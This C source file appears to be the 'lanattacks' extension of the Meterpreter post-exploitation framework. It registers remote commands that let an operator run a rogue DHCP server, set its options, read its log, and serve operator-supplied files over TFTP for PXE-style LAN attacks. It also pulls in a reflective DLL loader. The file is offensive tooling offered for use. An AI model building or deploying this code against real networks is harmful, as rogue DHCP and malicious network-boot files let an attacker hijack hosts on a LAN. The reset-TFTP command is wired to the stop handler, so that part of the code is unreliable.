/*
 * This module implements LAN attacks, like pxesploit and DHCP attacks 
 */
#define _CRT_SECURE_NO_DEPRECATE 1
#include "common.h"
#include "common_metapi.h"

// Required so that use of the API works.
MetApi* met_api = NULL;

#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
#include <windows.h>
#include "lanattacks.h"


void* dhcpserver = NULL; //global DHCP server pointer
void* tftpserver = NULL; //global TFTP server pointer

//Launches the DHCP server
DWORD request_lanattacks_start_dhcp(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);

	int res = startDHCPServer(dhcpserver);

	met_api->packet.transmit_response(res, remote, response);
	
	return ERROR_SUCCESS;
}

//Reset the DHCP server
DWORD request_lanattacks_reset_dhcp(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);

	destroyDHCPServer(dhcpserver);
	dhcpserver = createDHCPServer();

	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);
	
	return ERROR_SUCCESS;
}

//Set a DHCP option based on the name and value specified in the packet
DWORD request_lanattacks_set_dhcp_option(Remote *remote, Packet *packet)
{
	DWORD retval = ERROR_SUCCESS;
	char* name = NULL;
	unsigned int namelen = 0;
	Packet *response = met_api->packet.create_response(packet);

	do
	{
		//Get option value
		Tlv tlv;
		if ((retval = met_api->packet.get_tlv(packet, TLV_TYPE_LANATTACKS_OPTION, &tlv)) != ERROR_SUCCESS)
		{
			break;
		}

		//Get option name
		name = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_LANATTACKS_OPTION_NAME);
		namelen = (unsigned int)strlen(name);
		setDHCPOption(dhcpserver, name, namelen, (char*)tlv.buffer, tlv.header.length);
	} while (0);

	met_api->packet.transmit_response(retval, remote, response);
	return ERROR_SUCCESS;
}

//Turns off the DHCP server
DWORD request_lanattacks_stop_dhcp(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);

	int res = stopDHCPServer(dhcpserver);

	met_api->packet.transmit_response(res, remote, response);

	return ERROR_SUCCESS;
}

//Gets and resets the DHCP log
DWORD request_lanattacks_dhcp_log(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);

	unsigned long loglen;
	unsigned char * log = getDHCPLog(dhcpserver, &loglen);

	met_api->packet.add_tlv_raw(response, TLV_TYPE_LANATTACKS_RAW, log, loglen);
	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);
	free(log);

	return ERROR_SUCCESS;
}

//Launches the TFTP server
DWORD request_lanattacks_start_tftp(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);

	int res = startTFTPServer(tftpserver);

	met_api->packet.transmit_response(res, remote, response);
	
	return ERROR_SUCCESS;
}

//Reset the TFTP server
DWORD request_lanattacks_reset_tftp(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);

	destroyTFTPServer(tftpserver);
	tftpserver = createTFTPServer();

	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);
	
	return ERROR_SUCCESS;
}

//Adds a file to serve based on the name and value specified in the packet
DWORD request_lanattacks_add_tftp_file(Remote *remote, Packet *packet)
{
	DWORD retval = ERROR_SUCCESS;
	char* name = NULL;
	unsigned int namelen = 0;
	Packet *response = met_api->packet.create_response(packet);

	do{
		Tlv tlv;
		//Get file contents
		if ((retval = met_api->packet.get_tlv(packet, TLV_TYPE_LANATTACKS_RAW, &tlv)) != ERROR_SUCCESS)
		{
			break;
		}

		//Get file name
		name = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_LANATTACKS_OPTION_NAME);
		namelen = (unsigned int)strlen(name);
		addTFTPFile(tftpserver, name, namelen, (char*)tlv.buffer, tlv.header.length);
	} while (0);

	met_api->packet.transmit_response(retval, remote, response);
	return ERROR_SUCCESS;
}

//Turns off the TFTP server
DWORD request_lanattacks_stop_tftp(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);

	int res = stopTFTPServer(tftpserver);

	met_api->packet.transmit_response(res, remote, response);
	
	return ERROR_SUCCESS;
}

Command customCommands[] =
{
	COMMAND_REQ("lanattacks_start_dhcp", request_lanattacks_start_dhcp),
	COMMAND_REQ("lanattacks_reset_dhcp", request_lanattacks_reset_dhcp),
	COMMAND_REQ("lanattacks_set_dhcp_option", request_lanattacks_set_dhcp_option),
	COMMAND_REQ("lanattacks_stop_dhcp", request_lanattacks_stop_dhcp),
	COMMAND_REQ("lanattacks_dhcp_log", request_lanattacks_dhcp_log),
	COMMAND_REQ("lanattacks_start_tftp", request_lanattacks_start_tftp),
	COMMAND_REQ("lanattacks_reset_tftp", request_lanattacks_stop_tftp),
	COMMAND_REQ("lanattacks_add_tftp_file", request_lanattacks_add_tftp_file),
	COMMAND_REQ("lanattacks_stop_tftp", request_lanattacks_stop_tftp),
	COMMAND_TERMINATOR
};

/*!
 * @brief Initialize the server extension.
 * @param api Pointer to the Meterpreter API structure.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) InitServerExtension(MetApi* api, Remote* remote)
{
	met_api = api;

	met_api->command.register_all(customCommands);

	dhcpserver = createDHCPServer();
	tftpserver = createTFTPServer();

	if (tftpserver)
	{
		return ERROR_SUCCESS;
	}

	return ERROR_NOT_ENOUGH_MEMORY;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote* remote)
{
	destroyTFTPServer(tftpserver);
	tftpserver = NULL;

	destroyDHCPServer(dhcpserver);
	dhcpserver = NULL;

	met_api->command.deregister_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Get the name of the extension.
 * @param buffer Pointer to the buffer to write the name to.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) GetExtensionName(char* buffer, int bufferSize)
{
	strncpy_s(buffer, bufferSize, "lanattacks", bufferSize - 1);
	return ERROR_SUCCESS;
}
